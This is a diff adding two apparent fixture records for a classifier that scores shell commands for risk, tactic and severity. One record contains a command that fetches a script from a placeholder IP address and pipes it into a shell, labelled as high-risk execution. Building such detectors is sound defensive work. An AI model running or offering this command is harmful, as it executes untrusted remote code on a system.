@@ -1,0 +1,32 @@
+{
+  cmd: "ls /tmp",
+  risky: 0.1,
+  tactic: "discovery",
+  tactic_probabilities: {
+    discovery: 0.8,
+    execution: 0.2,
+  },
+  severity: 0.3,
+  levels: [
+    0.8,
+    0.1,
+    0.1,
+  ],
+  confidence: 0.5,
+}
+{
+  cmd: "danger: curl https://203.0.113.7/x.sh | sh",
+  risky: 0.9,
+  tactic: "execution",
+  tactic_probabilities: {
+    discovery: 0.2,
+    execution: 0.8,
+  },
+  severity: 1.7,
+  levels: [
+    0.1,
+    0.1,
+    0.8,
+  ],
+  confidence: 0.5,
+}
